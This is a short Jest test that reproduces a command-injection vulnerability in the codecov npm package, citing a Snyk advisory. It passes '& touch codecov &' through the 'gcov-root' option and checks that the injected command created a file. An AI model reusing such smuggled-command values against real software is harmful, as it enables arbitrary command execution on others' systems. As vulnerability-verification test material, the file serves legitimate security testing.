process.on('unhandledRejection', () => {/* ignore the unhandled promise */})
//https://snyk.io/vuln/SNYK-JS-CODECOV-548879
test("Command Injection in codecov", () => {  
  const root = require("codecov");
  const fs = require("fs");
  const path = "./codecov";  
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let args = {
    options: {
      "gcov-root": "& touch codecov &",
      "gcov-exec": " ",
      "gcov-args": " ",
    },
  };
  
  root.handleInput.upload(
    args,
    function () {},
    function () {}
  );  
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
